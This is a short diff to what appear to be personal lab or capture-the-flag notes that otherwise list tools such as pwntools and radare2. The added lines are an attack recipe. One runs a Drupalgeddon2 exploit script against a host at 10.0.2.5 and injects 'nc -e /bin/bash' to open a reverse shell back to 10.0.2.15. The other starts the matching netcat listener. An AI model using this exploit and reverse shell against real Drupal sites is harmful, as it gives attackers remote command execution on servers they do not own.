@@ -2851,4 +2851,11 @@ Useful toold installed on machines:
     * pwntools (https://github.com/Gallopsled/pwntools)
     * radare2 (http://www.radare.org/)
 
+A:
+python2 drupalgeddon2.py -h http://10.0.2.5 -c 'nohup nc -e /bin/bash 10.0.2.15 9000 &'
+
+
+T:
+nc -lnvp 9000
+
 
